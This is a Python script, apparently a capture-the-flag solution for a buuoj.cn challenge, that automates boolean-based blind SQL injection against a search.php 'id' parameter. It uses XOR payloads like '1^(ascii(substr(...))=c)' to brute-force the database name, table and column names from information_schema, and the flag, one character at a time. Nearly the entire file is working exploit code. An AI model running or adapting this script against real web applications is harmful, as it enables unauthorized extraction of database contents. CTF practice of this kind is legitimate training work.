#!/usr/bin/env python3
import requests

url = "http://0a24f8a2-89ab-4896-b827-a4e6d5660cda.node5.buuoj.cn:81/search.php"

def check(payload):
    """返回 True 表示条件为假(页面ERROR), False 表示条件为真(页面正常)"""
    try:
        r = requests.get(url, params={"id": payload}, timeout=10)
        # ERROR 表示 1^1=0, 正常表示 1^0=1
        return "ERROR" in r.text or "Error" in r.text
    except:
        return True

def get_char(query, pos):
    """获取指定位置的字符ASCII值"""
    for c in range(32, 127):
        payload = f"1^(ascii(substr(({query}),{pos},1))={c})"
        if not check(payload):  # 页面正常表示匹配
            return chr(c)
    return None

def get_length(query, max_len=100):
    """获取字符串长度"""
    for i in range(1, max_len):
        payload = f"1^(length(({query}))={i})"
        if not check(payload):
            return i
    return 0

def blind_extract(query, name=""):
    """盲注提取数据"""
    length = get_length(query)
    print(f"[*] {name} length: {length}")
    result = ""
    for i in range(1, length + 1):
        c = get_char(query, i)
        if c:
            result += c
            print(f"    {name}: {result}")
        else:
            result += "?"
    return result

# 测试
print("[*] Testing...")
print(f"    1^(1=1) should be ERROR: {check('1^(1=1)')}")
print(f"    1^(1=0) should be normal: {check('1^(1=0)')}")

# 获取数据库名
db = blind_extract("database()", "Database")

# 获取表名
tables = blind_extract("select group_concat(table_name) from information_schema.tables where table_schema=database()", "Tables")

# 获取列名
cols = blind_extract("select group_concat(column_name) from information_schema.columns where table_schema=database()", "Columns")

# 获取flag
flag = blind_extract("select flag from flag", "Flag")
print(f"\n[+] FLAG: {flag}")
